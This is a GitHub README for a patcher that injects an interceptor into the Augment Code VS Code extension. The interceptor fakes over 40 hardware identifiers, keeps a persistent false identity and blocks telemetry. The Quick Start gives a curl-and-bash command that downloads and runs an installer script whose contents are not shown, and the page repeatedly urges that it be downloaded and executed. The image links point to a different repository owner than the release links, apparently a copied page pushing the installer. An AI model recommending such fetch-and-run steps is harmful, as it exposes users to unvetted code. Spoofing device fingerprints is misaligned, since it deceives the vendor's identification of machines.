# Augment Code Extension Interceptor — VS Code Privacy Patch 🛡️

[![Releases](https://img.shields.io/github/v/release/Dipster72/augment-code-patcher?label=Releases&logo=github)](https://github.com/Dipster72/augment-code-patcher/releases)

![shield-privacy](https://img.shields.io/badge/privacy-protection-blue)
![vsix](https://img.shields.io/badge/format-VSIX-green)

A privacy-focused patch for the Augment Code VS Code extension. This repo builds a patched VSIX that intercepts telemetry and hardware calls, and supplies stable fake identities and hardware data to avoid leaking sensitive system details.

About this repository:
- Name: augment-code-patcher
- Purpose: Patch Augment.vscode-augment to intercept telemetry and system info
- Output: Patched .vsix and helper scripts

Hero image  
![privacy-hero](https://raw.githubusercontent.com/cylind/augment-code-patcher/main/assets/hero-shield.png)

---

## Project at a glance / 项目概览

This project supplies a set of tools and a GitHub Actions workflow that:
- download the official Augment Code extension,
- inject an interceptor (augment-interceptor.js),
- repackage the extension as a patched .vsix,
- publish the artifact to Releases.

本项目提供下载、注入拦截器、打包并发布到 Releases 的完整流程。插件在运行时会替换系统信息接口和关键文件读写路径，以阻断或伪造遥测与硬件指纹信息。

---

## Key features / 核心功能

- 40+ hardware fields faked (CPU id, memory size, motherboard serials, BIOS id, etc)  
- Layered network policy to intercept telemetry with fine control  
- Interception of SystemInformation library calls (40+ methods simulated)  
- Hardware config templates (Intel/AMD desktop, laptop templates)  
- File-system privacy hooks (inode, SSH key reads)  
- Persistent fake identity store to keep identity stable across sessions

---

## How it works / 工作原理

1. The workflow downloads the upstream Augment.vscode-augment package.
2. It unpacks the VSIX and finds the runtime module that calls SystemInformation and telemetry endpoints.
3. The build injects augment-interceptor.js into the module loader chain.
4. The interceptor hooks selected APIs and rewrites return values with curated fake data.
5. The system stores a stable fake identity in a local JSON file so values persist between launches.
6. The workflow repacks the extension and uploads the patched VSIX to Releases.

Jargon: VSIX, SystemInformation, telemetry, binary patch, module hook.

---

## Quick start / 快速开始

Method 1 — Download the prebuilt patched package (recommended)  
1. Visit the Releases page and download the installer file. The file must be downloaded and executed from:
   https://github.com/Dipster72/augment-code-patcher/releases
2. Run the installer on a machine that has network and file access. Example commands (replace with the actual release filename you downloaded):
```bash
# Example: download the installer from Releases page and run it
curl -L -o augment-patcher-installer.sh "https://github.com/Dipster72/augment-code-patcher/releases/download/v1.0.0/augment-patcher-installer.sh"
bash ./augment-patcher-installer.sh
```
3. The installer downloads the official Augment extension, applies the patch, and writes a .vsix file.
4. Install the .vsix in VS Code: open Extensions view → ... → Install from VSIX… → select the .vsix file.
5. Restart VS Code.

Method 2 — Manual build and install  
1. Clone the repo:
```bash
git clone https://github.com/Dipster72/augment-code-patcher.git
cd augment-code-patcher
```
2. Inspect or edit templates in ./templates to choose a hardware profile.
3. Run the local build script:
```bash
./scripts/build-vsix.sh
```
4. Check ./dist for the patched .vsix and install via VS Code.

If the releases link does not work, check the Releases section in this repo to find the latest artifacts.

---

## Releases link (again)

Download the installer or the latest patched .vsix from:
https://github.com/Dipster72/augment-code-patcher/releases  
The Releases page contains executable installers and prebuilt .vsix files. Download the file that matches your platform and run the installer script to generate a patched extension.

---

## Files you will find

- augment-interceptor.js — main runtime interceptor that hooks APIs and telemetry
- scripts/build-vsix.sh — local packer script
- scripts/installer.sh — installer wrapper used in Releases
- templates/ — hardware and identity templates (Intel desktop, AMD laptop, generic VM)
- src/patchers/ — module patch logic for various upstream code paths
- docs/ — technical docs and API mapping used for interception
- README.md — this file

---

## Templates and identities

Templates supply realistic values for:
- CPU vendor and model
- core counts and caches
- RAM size and speed
- disk model, serial, and partition layout
- motherboard vendor, model, serial
- BIOS date and id
- MAC patterns and WiFi adapter names

The persistence system stores a generated identity file (identity.json) in the user data path. The interceptor reads this file and returns the same values every session. This hides the true hardware and prevents per-run randomization that would look suspicious.

---

## Telemetry control

The interceptor implements a layered network policy:
- Block known telemetry endpoints by default.
- Intercept outgoing JSON payloads and scrub or replace fields.
- Allow extension update checks when the user opts in.

You can extend the policy in ./src/policies/network-policy.js. The code exposes a small set of rules that match URL patterns and payload keys.

---

## SystemInformation hooks

We map the most used SystemInformation methods to stubs. The hooks include:
- system, cpu, mem, diskLayout, baseboard, bios
- networkInterfaces, wifiConnections, osInfo
- processList, services

Each stub returns values that match the OS and chosen template. The goal is to keep responses consistent and realistic.

---

## CI / GitHub Actions

The repo includes a workflow that:
- runs on new tag or manual dispatch,
- fetches the upstream Augment.vscode-augment,
- injects the interceptor,
- runs unit tests for the hook layer,
- builds a patched .vsix,
- uploads the .vsix to Releases.

The workflow uses standard actions for checkout, node setup, and artifact upload. It runs on Ubuntu and uses Docker for repeatable builds when native packaging is needed.

---

## FAQ

Q: Will this change my settings or user files?  
A: The patch touches only the extension runtime. It does not change your VS Code settings or user workspace files. It writes a small identity.json to the extension storage path.

Q: Is the fake identity randomized each run?  
A: No. The system persists the fake identity to avoid per-run randomization that may look like instability.

Q: Can I use my own hardware template?  
A: Yes. Add a JSON file in ./templates and reference it in the build or installer.

Q: How do I revert to the official extension?  
A: Remove the patched extension from VS Code and reinstall the official Augment.vscode-augment from the Marketplace.

Q: Does this block updates?  
A: The interceptor does not block VS Code updates. It can block the extension's telemetry and remote calls per policy.

---

## Troubleshooting

- If the patched extension fails to load, check the Developer Tools console in VS Code for load errors.  
- If identity.json does not persist, verify file permissions for the extension storage path.  
- If telemetry still appears, open the interceptor log (in the extension storage folder) and inspect outbound requests. Logs show which endpoints matched the network policy.

---

## Contributing

- Fork the repo and create a branch for your feature or fix.  
- Add tests for new hooks in ./test.  
- Open a pull request with a clear description of the change and the template used.  
- Keep commits small and focused.

Coding style:
- Node 14+.
- Use plain JS for runtime hooks.
- Keep templates JSON-first.

---

## License

This project uses the MIT license. See LICENSE file for full terms.

---

Images and icons
- Shields: https://img.shields.io  
- Hero and icons: use images in ./assets or link to public shields and GitHub logos.

Contribute code, submit issues, or check Releases for prebuilt installers and VSIX files:
https://github.com/Dipster72/augment-code-patcher/releases